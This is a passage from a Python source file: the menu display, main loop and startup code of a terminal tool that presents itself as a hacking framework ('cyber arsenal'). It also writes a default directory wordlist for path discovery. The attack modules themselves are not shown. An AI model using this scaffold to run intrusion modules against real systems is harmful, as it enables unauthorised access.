    print(f"{C.BL}╚{'═'*(w-2)}╝{C.RS}")
    
    root_str = "ROOT" if IS_ROOT else "USER"
    plat = "Android" if IS_ANDROID else ("Linux" if IS_LINUX else "Windows")
    print(f"\n [{root_str}] {plat}\n")
    
    print(f"{C.Y}    {'='*(w-8)}{C.RS}")
    print(f"{C.Y}    SELECT A CATEGORY:{C.RS}")
    print(f"{C.Y}    {'='*(w-8)}{C.RS}\n")
    
    # PATCH 3: Fixed alignment
    for key, (cat_name, items) in MENU.items():
        name = pad(cat_name, 28)
        tools = f"[{len(items)} tools]"
        print(f"    |  [{key}]  {name} {tools}")
    
    print(f"\n    {'='*(w-8)}")
    print(f"\n    |  [0]  EXIT {PROJECT}")
    print(f"    {'='*(w-8)}")

# ============================================================
# PATCH 5: Category menu (no wrap, no misalignment)
# ============================================================
def print_category_menu(cat_name: str, items: list):
    """Display category submenu without wrapping."""
    clear_screen()
    w = safe_terminal_width()
    
    print(f"{C.BG_M}{C.BL}{C.BD}  {safe_text(cat_name)}  {C.RS}\n")
    
    print(f"{C.BL}╔{'═'*(w-2)}╗{C.RS}")
    print(f"{C.BL}║{C.RS}  Select a module{' '*(w-20)}{C.BL}║{C.RS}")
    print(f"{C.BL}╚{'═'*(w-2)}╝{C.RS}\n")
    
    for num, name, _, desc in items:
        name = safe_text(name)[:40]
        desc = safe_text(desc)[:70]
        print(f"  {C.Y}[{num}]{C.RS} {C.G}{name}{C.RS}")
        print(f"       {C.BL}|- {desc}{C.RS}")
    
    print(f"\n  [b] Back")
    print(f"  [0] Exit")

# ============================================================
# MAIN LOOP
# ============================================================
def main_loop():
    """Main application loop."""
    while True:
        try:
            print_main_menu()
            cat_choice = safe_input(f"\n {C.Y}Category -> {C.RS}")
            
            if cat_choice == '0':
                print(f"\n{C.R}[!] Exiting {PROJECT}...{C.RS}")
                typing_effect(f"{C.C}The stars align... until next time, hacker.{C.RS}", 0.05)
                sys.exit(0)
            
            if cat_choice not in MENU:
                log_warning("Invalid category number")
                pause_screen()
                continue
            
            cat_name, items = MENU[cat_choice]
            
            while True:
                print_category_menu(cat_name, items)
                mod_choice = safe_input(f"\n {C.Y}Module -> {C.RS}").strip().lower()
                
                if mod_choice == '0':
                    print(f"\n{C.R}[!] Exiting...{C.RS}")
                    sys.exit(0)
                elif mod_choice == 'b':
                    break
                
                found = False
                for num, name, func, desc in items:
                    if mod_choice == num or mod_choice == num.lstrip('0'):
                        clear_screen()
                        try:
                            result = func()
                            if result:
                                status = f"{C.G}{result.message}{C.RS}" if result.success else f"{C.R}{result.message}{C.RS}"
                                log_info(f"Module: {status}")
                        except Exception as e:
                            log_error(f"Module crashed: {e}")
                            log_debug(traceback.format_exc())
                        found = True
                        break
                
                if not found:
                    log_warning("Invalid module number")
                    pause_screen()
        
        except KeyboardInterrupt:
            print(f"\n{C.Y}[!] Interrupted{C.RS}")
            if safe_input("Exit? (y/n): ").lower() == 'y':
                sys.exit(0)
        except Exception as e:
            log_error(f"Error: {e}")
            log_debug(traceback.format_exc())
            pause_screen()

# ============================================================
# INITIALIZATION
# ============================================================
def initialize():
    """Framework bootstrap."""
    clear_screen()
    for d in [OUTPUT_DIR, CONFIG_DIR, WORDLIST_DIR]:
        try:
            d.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            log_warning(f"Could not create {d}: {e}")
    default_wl = WORDLIST_DIR / 'common.txt'
    if not default_wl.exists():
        try:
            with open(default_wl, 'w') as f:
                f.write('\n'.join(COMMON_DIRS))
            log_info(f"Created wordlist: {default_wl}")
        except:
            pass
    typing_effect(f"{C.C}{C.BD}INITIALIZING {PROJECT} FRAMEWORK...{C.RS}", 0.02)
    time.sleep(0.3)
    typing_effect(f"{C.M}{C.BD}Loading cyber arsenal...{C.RS}", 0.02)
    time.sleep(0.2)
    if IS_ROOT:
        print(f"\n{C.BG_R}{C.BL}{C.BD} ROOT MODE - Full access{C.RS}")
    else:
        print(f"\n{C.BG_Y}{C.BL}{C.BD} USER MODE - Limited{C.RS}")
    time.sleep(0.5)

# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == '__main__':
    try:
        signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
        initialize()
        main_loop()
    except KeyboardInterrupt:
        print(f"\n{C.R}[!] {PROJECT} terminated{C.RS}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{C.R}[!] Fatal: {e}{C.RS}")
        traceback.print_exc()
        sys.exit(1)